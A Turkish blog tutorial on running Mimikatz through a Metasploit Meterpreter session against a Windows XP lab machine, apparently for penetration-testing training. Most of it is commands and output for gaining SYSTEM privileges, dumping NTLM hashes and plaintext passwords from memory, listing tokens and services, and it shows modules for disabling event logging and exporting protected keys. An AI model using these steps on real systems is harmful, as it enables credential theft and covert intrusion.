---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-16T13:59:00Z"
excerpt: Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple,
  harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda,
  mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere
  bakacağız.
guid: https://www.siberoloji.com/?p=1219
id: 1219
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Mimikatz
url: /tr/msf-mimikatz/
---

 <p>Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.</p>
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="mimikatz-nedir">Mimikatz nedir? 
<!-- /wp:heading -->

 <p>Mimikatz, esasında Benjamin Delpy tarafından yazılan bir post-exploitation programıdır. Hedef bilgisayardan bilgi toplama için kullanılır. Mimikatz, bilgi toplama için gerekli bir çok farklı komutu bünyesinde toplamıştır.</p>
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="mimikatz-yükleme">Mimikatz Yükleme 
<!-- /wp:heading -->

 <p>Mimikatz, hedef sistemde bir Meterpreter oturumu açtıktan sonra çalıştırılabilir. Sisteme herhangi bir dosya yüklemeye gerek kalmadan hafıza üzerinde çalışır. Etkin olarak çalışabilmesi için SYSTEM seviyesinde oturum yetkilerine sahip olmamız gerekir.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> getuid
Server username: WINXP-E95CE571A1\Administrator
</code></pre>
<!-- /wp:code -->

 <p>Bu çıktıda, hedef sistemde SYSTEM seviyesinde olmadığımız görülmektedir. Öncelikle SYSTEM seviyesine geçmeye çalışalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> getsystem
...got system <strong>(</strong>via technique 1<strong>)</strong>.

meterpreter <strong>&gt;</strong> getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>
<!-- /wp:code -->

 <p>Başarılı olduysanız yukarıdaki gibi SYSTEM seviyesine geçtiğinize dair çıktı alırsınız.</p>
 

 <p>Mimikatz, 32-bit ve 64-bit mimarilerde çalışmak üzere tasarlanmıştır. SYSTEM seviyesine geçtikten sonra hedef sistemin mimarisinin ne olduğuna&nbsp;<code>sysinfo</code>&nbsp;komutuyla bakmalıyız. Bazen, Meterpreter oturum 64-bit mimaride çalışan bir 32-bit mimari prosesinde oturum açmış olabilir. Bu durumda mimikatz’ın bazı özellikleri çalışmayacaktır. Meterpreter oturumu 32-bit bir proseste çalışıyorsa (Mimari aslında 64-bit olmasına rağmen), mimikatz, 32-bit için yazılımları kullanmaya çalışacaktır. Bunun önüne geçmenin yolu&nbsp;<code>ps</code>&nbsp;komutuyla çalışan proseslere bakmak ve&nbsp;<code>migrate</code>&nbsp;komutuyla başka bir prosese geçmektir.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> sysinfo
Computer        : WINXP-E95CE571A1
OS              : Windows XP <strong>(</strong>Build 2600, Service Pack 3<strong>)</strong>.
Architecture    : x86
System Language : en_US
Meterpreter     : x86/win32
</code></pre>
<!-- /wp:code -->

 <p>Burada görülen çıktıda, hedef makinenin zaten 32-bit mimaride olduğunu görüyoruz. O zaman, 32-bit, 64-bit çakışması bulunmamaktadır. Artık&nbsp;<code>mimikatz</code>&nbsp;modülünü yükleyebiliriz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> load mimikatz
Loading extension mimikatz...success.
</code></pre>
<!-- /wp:code -->

 <p>Yükleme başarıyla tamamlandıktan sonra öncelikle yardım bilgisini görüntüleyelim.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> help mimikatz

Mimikatz Commands
<strong>=================</strong>

    Command           Description
    -------           -----------
    kerberos          Attempt to retrieve kerberos creds
    livessp           Attempt to retrieve livessp creds
    mimikatz_command  Run a custom commannd
    msv               Attempt to retrieve msv creds <strong>(</strong>hashes<strong>)</strong>
    ssp               Attempt to retrieve ssp creds
    tspkg             Attempt to retrieve tspkg creds
    wdigest           Attempt to retrieve wdigest creds
</code></pre>
<!-- /wp:code -->

 <p>Mimikatz, temel olarak yukarıdaki komutları kullanmamızı sağlarsa da içlerinde en güçlüsü&nbsp;<code>mimikatz_command</code>&nbsp;seçeneğidir.</p>
 

 <p>Öncelikle mimikatz sürümünü kontrol edelim.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f version
mimikatz 1.0 x86 <strong>(</strong>RC<strong>)</strong> <strong>(</strong>Nov  7 2013 08:21:02<strong>)</strong>
</code></pre>
<!-- /wp:code -->

 <p>Mimikatz’ın sağladığı bir takım modüller bulunur. Bu modüllerin listesini görmek için sistemde bulunmayan bir modül ismi vermeniz yeterlidir. Bu durumda mimikatz size kullanılabilir modüllerin listesini verecektir. Komut kullanımında&nbsp;<code>modüladı::</code>&nbsp;kullanım formatına dikkat edin.</p>
 

 <p>Aşağıdaki örnekte,&nbsp;<code>fu::</code>&nbsp;modülü istenmiştir. Böyle bir modül olmadığından kullanılabilir tüm modülleri listelemiş olduk.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f fu::
Module : 'fu' introuvable

Modules disponibles : 
                - Standard
      crypto    - Cryptographie et certificats
        hash    - Hash
      system    - Gestion système
     process    - Manipulation des processus
      thread    - Manipulation des threads
     service    - Manipulation des services
   privilege    - Manipulation des privilèges
      handle    - Manipulation des handles
 impersonate    - Manipulation tokens d'accès
     winmine    - Manipulation du démineur
 minesweeper    - Manipulation du démineur 7
       nogpo    - Anti-gpo et patchs divers
     samdump    - Dump de SAM
      inject    - Injecteur de librairies
          ts    - Terminal Server
      divers    - Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
    sekurlsa    - Dump des sessions courantes par providers LSASS
         efs    - Manipulations EFS
</code></pre>
<!-- /wp:code -->

 <p>Bu listede bulunan modüllerin kullanılabilir seçeneklerini listelemek için modül ismini vererek girilen komut aşağıdaki formatta kullanılmaktadır.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter &gt; mimikatz_command -f divers::
Module : 'divers' identifié, mais commande '' introuvable

Description du module : Fonctions diverses n'ayant pas encore assez de corps pour avoir leurs propres module
  noroutemon    - [experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage
   eventdrop    - [super experimental] Patch l'observateur d'événements pour ne plus rien enregistrer
  cancelator    - Patch le bouton annuler de Windows XP et 2003 en console pour déverrouiller une session
     secrets    - Affiche les secrets utilisateur
</code></pre>
<!-- /wp:code -->

 <p>Gördüğünüz gibi&nbsp;<code>drivers</code>&nbsp;modülünün,&nbsp;<code>noroutemon, eventdrop, cancelator, secrets</code>&nbsp;seçenekleri bulunmaktadır.</p>
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="ram-hafızadan-hash-ve-parola-okuma">RAM Hafızadan Hash ve Parola Okuma 
<!-- /wp:heading -->

 <p>RAM hafızadan Hash değerlerini ve parolaları okumak için Metasploit Framework’ün sağladığı kendi komutlarını kullanabileceğimiz gibi&nbsp;<code>mimikaz</code>&nbsp;modüllerini de kullanabiliriz.</p>
 

 
<h2 class="wp-block-heading" id="metasploit-komutları-ile-bilgi-elde-etme">Metasploit Komutları ile Bilgi Elde etme</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter &gt; msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID   Package    Domain           User              Password
------   -------    ------           ----              --------
0;78980  NTLM       WINXP-E95CE571A1  Administrator     lm{ 00000000000000000000000000000000 }, ntlm{ d6eec67681a3be111b5605849505628f }
0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0;56683  NTLM                                          n.s. (Credentials KO)
0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  n.s. (Credentials KO)

meterpreter &gt; kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID   Package    Domain           User              Password
------   -------    ------           ----              --------
0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     
0;56683  NTLM                                          
0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   
0;78980  NTLM       WINXP-E95CE571A1  Administrator     SuperSecretPassword
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="mimikatz-modülleri-ile-bilgi-elde-etme">Mimikatz Modülleri ile Bilgi Elde Etme</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f samdump::hashes
Ordinateur : winxp-e95ce571a1
BootKey    : 553d8c1349162121e2a5d3d0f571db7f

Rid  : 500
User : Administrator
LM   : 
NTLM : d6eec67681a3be111b5605849505628f

Rid  : 501
User : Guest
LM   : 
NTLM : 

Rid  : 1000
User : HelpAssistant
LM   : 6165cd1a0ebc61e470475c82cd451e14
NTLM : 

Rid  : 1002
User : SUPPORT_388945a0
LM   : 
NTLM : 771ee1fce7225b28f8aec4a88aea9b6a

meterpreter <strong>&gt;</strong> mimikatz_command -f sekurlsa::searchPasswords
<strong>[</strong>0] <strong>{</strong> Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword <strong>}</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="diğer-modüller">Diğer Modüller 
<!-- /wp:heading -->

 <p>Yukarıda örnek olarak gösterilen modüllerin haricinde başka modüllerde bulunur. Bunların tamamını&nbsp;<a href="http://blog.gentilkiwi.com/">Mimikatz</a>&nbsp;web sayfasından inceleyebilirsiniz.</p>
 

 
<h2 class="wp-block-heading" id="kullanıcı-token-bilgileri">Kullanıcı Token Bilgileri</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f handle::
Module : 'handle' identifié, mais commande '' introuvable

Description du module : Manipulation des handles
list              - Affiche les handles du système <strong>(</strong>pour le moment juste les processus et tokens<strong>)</strong>
processStop       - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
tokenImpersonate  - Essaye d'impersonaliser un token en utilisant d'autres handles
nullAcl           - Positionne une ACL null sur des Handles


meterpreter &gt; mimikatz_command -f handle::list
...snip...
  760  lsass.exe                 -&gt;  1004       Token           NT AUTHORITY\NETWORK SERVICE
  760  lsass.exe                 -&gt;  1008       Process 704     winlogon.exe
  760  lsass.exe                 -&gt;  1052       Process 980     svchost.exe
  760  lsass.exe                 -&gt;  1072       Process 2664    fubar.exe
  760  lsass.exe                 -&gt;  1084       Token           NT AUTHORITY\LOCAL SERVICE
  760  lsass.exe                 -&gt;  1096       Process 704     winlogon.exe
  760  lsass.exe                 -&gt;  1264       Process 1124    svchost.exe
  760  lsass.exe                 -&gt;  1272       Token           NT AUTHORITY\ANONYMOUS LOGON
  760  lsass.exe                 -&gt;  1276       Process 1804    psia.exe
  760  lsass.exe                 -&gt;  1352       Process 480     jusched.exe
  760  lsass.exe                 -&gt;  1360       Process 2056    TPAutoConnSvc.exe
  760  lsass.exe                 -&gt;  1424       Token           WINXP-E95CE571A1\Administrator
...snip...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="windows-servisleri-i̇şlemleri">Windows Servisleri İşlemleri</h2>
<!-- /wp:heading -->

 <p>Mimikatz, Windows servislerini başlatma, durdurma ve kaldırma imkanı da sağlamaktadır. Servis modülüne ve seçeneklerine bakalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f service::
Module : 'service' identifié, mais commande '' introuvable

Description du module : Manipulation des services
        list    - Liste les services et pilotes
       start    - Démarre un service ou pilote
        stop    - Arrête un service ou pilote
      remove    - Supprime un service ou pilote
    mimikatz    - Installe et/ou démarre le pilote mimikatz
</code></pre>
<!-- /wp:code -->

 <p>Bu seçeneklerden, listeleme modülünü kullanalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f service::list
...snip...
        WIN32_SHARE_PROCESS     STOPPED RemoteRegistry  Remote Registry
        KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device <strong>(</strong>RFCOMM Protocol TDI<strong>)</strong>
        WIN32_OWN_PROCESS       STOPPED RpcLocator      Remote Procedure Call <strong>(</strong>RPC<strong>)</strong> Locator
  980   WIN32_OWN_PROCESS       RUNNING RpcSs   Remote Procedure Call <strong>(</strong>RPC<strong>)</strong>
        WIN32_OWN_PROCESS       STOPPED RSVP    QoS RSVP
  760   WIN32_SHARE_PROCESS     RUNNING SamSs   Security Accounts Manager
        WIN32_SHARE_PROCESS     STOPPED SCardSvr        Smart Card
 1124   WIN32_SHARE_PROCESS     RUNNING Schedule        Task Scheduler
        KERNEL_DRIVER   STOPPED Secdrv  Secdrv
 1124   INTERACTIVE_PROCESS     WIN32_SHARE_PROCESS     RUNNING seclogon        Secondary Logon
 1804   WIN32_OWN_PROCESS       RUNNING Secunia PSI Agent       Secunia PSI Agent
 3460   WIN32_OWN_PROCESS       RUNNING Secunia Update Agent    Secunia Update Agent
...snip...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="kripto-modülü">Kripto Modülü</h2>
<!-- /wp:heading -->

 <p>Mimikatz’ın sağladığı kripto modülüne ve seçeneklerine bakalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f crypto::
Module : 'crypto' identifié, mais commande '' introuvable

Description du module : Cryptographie et certificats
listProviders   - Liste les providers installés<strong>)</strong>
  listStores    - Liste les magasins système
listCertificates        - Liste les certificats
    listKeys    - Liste les conteneurs de clés
exportCertificates      - Exporte les certificats
  exportKeys    - Exporte les clés
    patchcng    - <strong>[</strong>experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
   patchcapi    - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable
</code></pre>
<!-- /wp:code -->

 <p>Bu seçeneklerden&nbsp;<code>listProviders</code>&nbsp;seçeneğini kullanalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter &gt; mimikatz_command -f crypto::listProviders
Providers CryptoAPI :
        Gemplus GemSAFE Card CSP v1.0
        Infineon SICRYPT Base Smart Card CSP
        Microsoft Base Cryptographic Provider v1.0
        Microsoft Base DSS and Diffie-Hellman Cryptographic Provider
        Microsoft Base DSS Cryptographic Provider
        Microsoft Base Smart Card Crypto Provider
        Microsoft DH SChannel Cryptographic Provider
        Microsoft Enhanced Cryptographic Provider v1.0
        Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider
        Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)
        Microsoft RSA SChannel Cryptographic Provider
        Microsoft Strong Cryptographic Provider
</code></pre>
<!-- /wp:code -->

 <p>Yukarıdaki örneklerden göreceğiniz gibi, Mimikatz’a ait modüller ve bu modüllerin seçenekleri bulunuyor. Çok geniş ihtimaller dahilinde kullanabileceğiniz komutları tek tek deneyerek tecrübe kazanmanızı tavsiye ediyorum.</p>
 